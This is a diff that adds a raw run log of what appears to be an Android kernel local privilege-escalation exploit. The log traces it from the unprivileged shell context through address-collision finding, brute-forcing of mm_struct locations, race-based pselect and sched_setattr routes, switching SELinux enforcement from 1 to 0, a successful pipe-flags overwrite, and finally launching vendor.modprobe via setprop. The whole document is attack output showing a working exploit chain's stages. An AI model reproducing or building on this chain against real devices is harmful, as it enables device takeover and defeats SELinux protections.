@@ -1,0 +1,82 @@
+[23:31:28.845354] [+] preload starting pid=7080
+[23:31:28.845737] [+] startup context pid=7080 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[23:31:28.845747] [+] startup limits pid=7080 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[23:31:28.845753] [+] build config pid=7080 label=m1q-S942QOPU1AZDE-pipe-flag slide=pselect main=pselect
+[23:31:28.845762] [+] p0 profile pid=7080 phys_offset=0000000080000000 kernel_phys_load=00000000c7800000 delta=0000000047800000 slide_logger=ffffff8049d221c0 bootid_data=ffffff8049e4cf48 init_task=ffffff8049d2d040 root_tg=ffffff8049f63580 sysctl_bootid=ffffff804a092e70
+[23:31:28.845874] [*] data_addr(SELINUX_ENFORCING) = ffffff8049fafb08
+[23:31:28.845891] [*] Start selinux. enforcing=1
+[23:31:29.001248] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[23:31:29.183991] [*] start finding collisisons
+[23:31:29.184173] [*] target    00000079fb49a0c8
+[23:31:34.896954] [*]   0000006768d188c0
+[23:31:40.982796] [*]   000000676a7cfe78
+[23:31:41.062951] [*]   000000676a8c3618
+[23:31:41.063006] [*] found 3 collisisons
+[23:31:41.106398] [*] start bruteforcing
+[23:31:41.106552] [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
+[23:31:41.106610] [*] [  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
+[23:31:41.106669] [*] [  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
+[23:31:41.106697] [*] [  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
+[23:31:41.106742] [*] [  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
+[23:31:41.107334] [*] [  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
+[23:31:41.111778] [23:31:41.111780] [*] [  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
+[*] [  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
+[23:31:41.189867] [*] done
+[23:31:41.299746] [*] run_main_route_threads
+[23:31:42.301111] [23:31:42.301111] [*] consumer usleep=50000
+[*] pselect enter
+[23:31:42.351321] [*] sched_setattr_tid enter
+[23:31:42.351461] [*] sched_setattr_tid exit
+[23:31:43.302216] [*] pselect returned attempt=1 ret=7 errno=0 calls=1 success=1 delay=50000
+[23:31:43.302286] [*] phase=2
+[23:31:43.302335] [*] selinux phase. enforce=0
+[23:31:43.302381] [*] pselect route done calls=1 success=1 step=0 errno=0
+[23:31:43.304640] [*] enforcing=0
+[23:31:43.304688] [*] Selinux phase done. Go to pipe flag phase.
+[23:31:43.532363] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[23:31:43.648467] [*] start finding collisisons
+[23:31:43.648593] [*] target    00000079fb49a0c8
+[23:31:43.961644] [*]   0000006765ee0700
+[23:31:44.314867] [*]   00000067666d66b0
+[23:31:44.553314] [*]   0000006766bcae50
+[23:31:44.553370] [*] found 3 collisisons
+[23:31:44.604561] [*] start bruteforcing
+[23:31:44.604789] [*] [  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
+[23:31:44.604808] [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
+[23:31:44.604834] [*] [  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
+[23:31:44.604919] [*] [  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
+[23:31:44.609033] [*] [  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
+[23:31:44.609038] [*] [  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
+[23:31:44.611765] [*] [  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
+[23:31:44.615782] [*] [  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
+[23:31:44.732115] [*] done
+[23:31:44.732573] [*] pipe flags route page base=ffffff89b90c8000
+[23:31:44.895506] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[23:31:45.026207] [*] start finding collisisons
+[23:31:45.026339] [*] target    00000079fb49a0c8
+[23:31:45.784379] [*]   0000006766a7b3d8
+[23:31:46.080209] [*]   00000067670eb758
+[23:31:46.266629] [*]   000000676747b3d8
+[23:31:46.266683] [*] found 3 collisisons
+[23:31:46.313754] [*] start bruteforcing
+[23:31:46.313899] [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
+[23:31:46.313953] [*] [  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
+[23:31:46.313968] [*] [  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
+[23:31:46.314013] [*] [  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
+[23:31:46.314027] [*] [  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
+[23:31:46.315773] [*] [  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
+[23:31:46.315775] [*] [  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
+[23:31:46.319777] [*] [  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
+[23:31:46.444732] [*] done
+[23:31:46.568209] [*] run_main_route_threads
+[23:31:47.569456] [*] pselect enter
+[23:31:47.571759] [*] consumer usleep=50000
+[23:31:47.621831] [*] sched_setattr_tid enter
+[23:31:47.621881] [*] sched_setattr_tid exit
+[23:31:48.570551] [*] pselect returned attempt=1 ret=3 errno=0 calls=1 success=1 delay=50000
+[23:31:48.570617] [*] phase=3
+[23:31:48.570640] [*] try_pipe_flags_stage called
+[23:31:48.571070] [+] pipe overwrite succeeded.
+[23:31:48.571095] [*] pselect route done calls=1 success=1 step=0 errno=0
+[23:31:48.574389] [*] Executing setprop ctl.start vendor.modprobe
+
